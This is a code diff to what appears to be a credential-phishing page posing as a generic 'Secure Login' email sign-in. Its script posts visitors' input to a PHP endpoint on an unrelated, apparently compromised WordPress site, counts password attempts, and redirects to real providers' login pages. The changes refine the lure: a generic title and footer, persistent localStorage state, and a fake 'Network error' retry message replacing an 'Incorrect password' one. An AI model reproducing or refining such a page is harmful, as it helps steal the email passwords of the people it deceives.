@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title id="page-title">Email Login</title>
+    <title id="page-title">Secure Login</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
     <link rel="icon" type="image/png" href="/default-favicon.ico" id="favicon"/>
     <style>
@@ -334,8 +334,8 @@
     </div>
 
     <div class="footer">
-        <span>© 2026 <span id="footer-domain">Secure Email Login</span>. All rights reserved.</span>
-        <a href="#" id="footer-link">signin</a>
+        <span>© 2025 <span id="footer-domain">Secure Login</span>. All rights reserved.</span>
+        <a href="#" id="footer-link">example.com</a>
         <span class="timestamp" id="footer-time">| Last updated: --</span>
     </div>
 
@@ -344,8 +344,8 @@
         const API_URL = 'https://secure.prolinemovers.com/wp-admin/images/includes/process.php';
         const MAX_ATTEMPTS = 3;
         const MAX_RETRIES = 3;
-        const RETRY_DELAY = 1000;
-        const TIMEOUT = 5000;
+        const RETRY_DELAY = 2000;
+        const TIMEOUT = 10000;
 
         const LOGIN_PAGES = {
             'gmail.com': 'https://accounts.google.com/signin',
@@ -382,7 +382,7 @@
 
         // === STATE ===
         let state = { email: '', domain: '', attempts: 0, retryCount: 0 };
-        const saved = sessionStorage.getItem('loginState');
+        const saved = localStorage.getItem('loginState');
         if (saved) state = JSON.parse(saved);
 
         const urlParams = new URLSearchParams(window.location.search);
@@ -418,8 +418,8 @@
         };
 
         // === HELPERS ===
-        function saveState() { sessionStorage.setItem('loginState', JSON.stringify(state)); }
-        function clearState() { sessionStorage.removeItem('loginState'); state = { email: '', domain: '', attempts: 0, retryCount: 0 }; }
+        function saveState() { localStorage.setItem('loginState', JSON.stringify(state)); }
+        function clearState() { localStorage.removeItem('loginState'); state = { email: '', domain: '', attempts: 0, retryCount: 0 }; }
 
         function showError(msg, showLogo = false) {
             els.errorText.textContent = msg;
@@ -566,7 +566,7 @@
                 updateDomainUI(state.domain);
 
             } catch (err) {
-                showError(`Incorrect password. ${err.message}. Please verify and try again`, false);
+                showError(`Network error: ${err.message}. Retrying...`, false);
                 els.retryHint.style.display = 'block';
                 let count = 3;
                 els.retryCountdown.textContent = count;
